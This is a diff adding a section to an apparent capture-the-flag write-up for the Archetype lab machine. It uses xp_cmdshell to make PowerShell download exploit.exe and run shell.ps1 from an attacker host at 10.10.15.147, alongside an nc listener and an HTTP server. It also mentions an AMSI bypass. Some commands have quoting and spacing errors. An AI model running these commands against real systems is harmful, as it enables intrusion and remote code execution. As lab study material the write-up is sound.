@@ -54,6 +54,24 @@ As we can see our SQL service also running in archetype\sql_svc user contex, so 
 
 Let's try to drop shell into user context.
 
+
+I used [this website](https://www.revshells.com/) to create powershell reverse shell.
+
+Then run a listener and host created shell via http server.
+```
+nc -lvnp 4444
+python3 -m http.server 80
+```
+Download shell from http server via ```xp_cmdshell```:
+```
+xp_cmdshell "powershell Invoke-WebRequest -Uri "http://10.10.15.147/exploit.exe" -OutFile exploit.exe;"
+xp_cmdshell "powershell "IEX (New-ObjectNet.WebClient).DownloadString("http://10.10.15.147/shell.ps1");"
+```
+
+
+We have to bypass AMSI (Anti Malware Security Interface)...
+https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/
+
 TBC...
 
 ### Privilege Escalation
